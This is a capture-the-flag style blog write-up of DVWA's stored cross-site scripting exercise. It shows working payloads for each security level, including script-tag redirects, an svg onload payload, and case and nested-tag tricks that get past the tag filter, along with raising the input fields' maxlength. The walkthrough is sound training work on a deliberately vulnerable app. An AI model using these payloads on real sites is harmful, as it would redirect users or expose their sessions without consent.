---
title: DVWA - XSS (Stored)
date: 2023-12-17
categories: [CTF, Web Exploitation]
tags: [dvwa, xss, xss-stored, cross-site-scripting, javascript]
img_path: /assets/dvwa/xss_stored
published: true
---

## Information

- [How to install dvwa on Kali](https://www.kali.org/tools/dvwa/).
- [Official GitHub repository](https://github.com/digininja/DVWA).

> The DVWA server itself contains instructions about almost everything.

_**Damn Vulnerable Web Application (DVWA)** is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment._

_The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface._

![](dvwa_home.png){: width='70%' }

The DVWA server has **4 different security levels** which can be set as seen below:

![](security_levels.png){: width='70%' }

- **Low**: This security level is completely vulnerable and has no security measures at all. It's use is to be as an example of how web application vulnerabilities manifest through bad coding practices and to serve as a platform to teach or learn basic exploitation techniques.
- **Medium**: This setting is mainly to give an example to the user of bad security practices, where the developer has tried but failed to secure an application. It also acts as a challenge to users to refine their exploitation techniques.
- **High**: This option is an extension to the medium difficulty, with a mixture of harder or alternative bad practices to attempt to secure the code. The vulnerability may not allow the same extent of the exploitation, similar in various Capture The Flags (CTFs) competitions.
- **Impossible**: This level should be secure against all vulnerabilities. It is used to compare the vulnerable source code to the secure source code.

## Cross-Site Scripting (XSS) (Stored)

XSS attacks are a type of injection problem, in which malicious scripts are injected into the otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application using input from a user in the output, without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user's browser has no way to know that the script should not be trusted, and will execute the JavaScript. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by your browser and used with that site. These scripts can even rewrite the content of the HTML page.

The **stored XSS is stored in the database**. The **stored XSS is permanent**, until the database is reset or the payload is manually deleted.

**Objective**: Redirect everyone to a web page of your choosing.

## Security: Low
> _Low level will not check the requested input, before including it to be used in the output text. ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_stored/xss_stored_low_source.php))._

1. There are 2 input fields: `Name` and `Message`. Let's start with something simple to see if it works:

    ```javascript
    <script>alert("XSS")</script>
    ```

    ![](low_test.png)

2. Let's try the payload we used in both previous sections, [DOM](https://cspanias.github.io/posts/DVWA-XSS-(DOM)/) and [Reflected](https://cspanias.github.io/posts/DVWA-XSS-(Reflected)/) XSS, but this time instead of stealing the cookie we will redirect the users to another site:

    ```javascript
    <script>window.location='https://cspanias.github.i
    ```

3. So it seems that a character limit is set for both fields that does not allows us to input our payload. We can modify the character length as follows:

    ![](max_length.png)

    The `maxlength` is set to 50 characters, so let's change that to 250:

    ![](max_length_250.png)

4. Let's try inserting our payload again:

    ```javascript
    <script>window.location='https://cspanias.github.io/'</script>
    ```

    Once we press enter:

    ![](low_redirection.png)

    Now, if we go back to DVWA home, and we click on the `XSS (Stored)` tab, we will be automatically redirected to https://cspanias.github.io.

5. For clearing the guestbook, we need to go to the DVWA homepage and change the security level to Impossible. Once this is done, we can safely go to the XSS (Stored) tab and clear the guestbook:

    ![](clear_guestbook_1.png)

    ![](clear_guestbook_2.png)

## Security: Medium
> _The developer had added some protection, however hasn't done every field the same way ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_stored/xss_stored_medium_source.php))._

1. This time the developer has put a great effort in sanitizing the `Message` field, but not so much the `Name` field. For the latter, the `<script>` tag is getting removed, so we can try any of the methods used on the [XSS (Reflected)](https://cspanias.github.io/posts/DVWA-XSS-(Reflected)/#security-medium) task, after first changing the field's `maxlength`:

    ![](medium_max_length.png)

    ```javascript
    <svg/onload=window.location='https://cspanias.github.io/'>
    ```

    ```javascript
    <SCRIPT>window.location='https://cspanias.github.io/'</script>
    ```

    ```javascript
    <scr<script>ipt>window.location='https://cspanias.github.io/'</script>
    ```

    ![](low_redirection.png)
    
## Security: High
> _The developer believe they have disabled all script usage by removing the pattern `<s*c*r*i*p*t` ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_stored/xss_stored_high_source.php))._

1. This time the developer changed the blacklisted pattern to `<s*c*r*i*p*t`, exactly like the High level of the [XSS (Reflected)](https://cspanias.github.io/posts/DVWA-XSS-(Reflected)/#security-medium) task. This blocks our last two attacks from the Medium level as they include the `<script>` tag, but not the first one:

    ```javascript
    <svg/onload=window.location='https://cspanias.github.io/'>
    ```

    ![](low_redirection.png)

    > Don't forget to increase the value of the `maxlength` variable.

## Security: Impossible
> _Using inbuilt PHP functions, such as [`htmlspecialchars()`](https://secure.php.net/manual/en/function.htmlspecialchars.php), its possible to escape any values which would alter the behaviour of the input ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_stored/xss_stored_impossible_source.php))._

## Resources

- Cryptocat's [video walkthrough](https://www.youtube.com/watch?v=P1I9UGpGdrU).
- OWASP's [Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/).
- GitHub's [XSS Payload List](https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/xss_payloads_quick.txt).